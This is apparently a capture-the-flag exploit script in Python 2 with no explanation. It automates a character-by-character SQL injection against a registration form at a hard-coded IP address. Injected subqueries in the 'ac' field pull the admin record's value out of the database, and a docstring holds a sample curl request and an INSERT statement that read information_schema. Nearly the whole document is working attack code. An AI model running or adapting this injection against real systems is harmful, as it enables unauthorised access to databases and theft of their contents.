import requests
'''
curl 'http://110.10.147.112/?p=reg' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://110.10.147.112' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.0 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://110.10.147.112/?p=reg' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7' -H 'Cookie: PHPSESSID=e1m6qjr3p4igkttsb6vmglpkrv' --data 'id=shpik10&pw=qwer1234&ac=%27%2B%28select+database%28%29%29%29--+-' --compressed

INSERT INTO users values('shshshAQQasd0042','db25f2fc14cd2d2b1e7af307241f548fb03c312a',''+ord(mid((select info from information_schema.processlist having info like 0x2570726f636573736c69737425),197,1)))-- -')

'''
res = ''


for i in range(1,1000):
	data = {"id":"shshshAQQQ"+str(i).rjust(4,'0'),"pw":"qwer1234","ac":"'+ord(mid((select x from (select id,ac x from users a having id=0x61646d696e)x),"+str(i)+",1)))-- -"}
	cookie = {"PHPSESSID":"shpikgodgod"}
	r = requests.post('http://110.10.147.112/?p=reg',data=data,cookies=cookie)
	q = r.text
	if 'hack' in q:
		print 'filtering'
		break
	if 'error' in q:
		print 'error'
		break

	r = requests.post('http://110.10.147.112/?p=info',cookies=cookie)
	t = r.text
	found = t.split('AC : ')[1].split('<br>')[0]
	res += chr(int(found))
	print res
	if found == '0':
		break




